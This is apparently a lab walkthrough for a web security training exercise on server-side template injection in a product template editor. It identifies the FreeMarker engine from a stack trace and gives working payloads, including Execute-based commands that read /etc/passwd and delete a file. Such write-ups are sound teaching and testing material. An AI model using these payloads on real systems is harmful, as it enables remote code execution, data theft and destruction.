# Detailed Walkthrough

Go to My account, log in using provided credentials.

Go to any product page. See the template is now editable. To save template changes POST request sent `/product/template?productId=<productId>` and body with parameters

`"csrf": csrf_token,"template": payload,"template-action": "save"` . This is our injection point.

Since we need to visit the page after saving the template it’s not very handy to bruteforce the injection point with Intruder. There’s another way - to change a template directly on the page and click preview to enable the rendering.

Change the value inside the tag to classic `7*7`, click preview. Observe the execution.

![image.png](Detailed%20Walkthrough/image.png)

Based on the basic decision tree it could be Mako template engine.

![image.png](Detailed%20Walkthrough/image%201.png)

But when I send the payload `${os.remove("/home/carlos/morale.txt")}` I got a stack trace. It definitely a FreeMarker engine.

```java
FreeMarker template error (DEBUG mode; use RETHROW in production!):
The following has evaluated to null or missing: ==> os [in template "freemarker" at line 5, column 43]
---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing,
either specify a default value like myOptionalVar!myDefault, or use <#if myOptionalVar??>when-present<#else>when-missing</#if>.
(These only cover the last step of the expression; to cover the whole expression, use parenthesis:
(myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? 
---- ---- FTL stack trace ("~" means nesting-related): 
- Failed at: ${os.remove("/home/carlos/morale.txt")} [in template "freemarker" at line 5, column 41] 
---- Java stack trace (for programmers): 
---- freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at 
freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at 
freemarker.core.UnexpectedTypeException.newDescriptionBuilder(UnexpectedTypeException.java:85) at 
freemarker.core.UnexpectedTypeException.<init>(UnexpectedTypeException.java:48) at 
freemarker.core.NonHashException.<init>(NonHashException.java:49) at 
freemarker.core.Dot._eval(Dot.java:48) at 
freemarker.core.Expression.eval(Expression.java:101) at 
freemarker.core.MethodCall._eval(MethodCall.java:55) at 
freemarker.core.Expression.eval(Expression.java:101) at 
freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at 
freemarker.core.DollarVariable.accept(DollarVariable.java:63) at 
freemarker.core.Environment.visit(Environment.java:331) at 
freemarker.core.Environment.visit(Environment.java:337) at 
freemarker.core.Environment.process(Environment.java:310) at 
freemarker.template.Template.process(Template.java:383) at 
lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58) at 
lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42) at 
lab.actions.common.Action.act(Action.java:57) at 
lab.actions.common.Action.run(Action.java:39) at 
lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23)
```

Payload for getting FreeMarker version

- `${.version}` or
- `<#assign freemarkerVersion = .version>` directive plus `${freemarkerVersion}` expression

![image.png](Detailed%20Walkthrough/image%202.png)

Use this payload to execut Linux command

`${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}` 

![image.png](Detailed%20Walkthrough/image%203.png)

Delete the file using payload `${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}`. See Lab solved.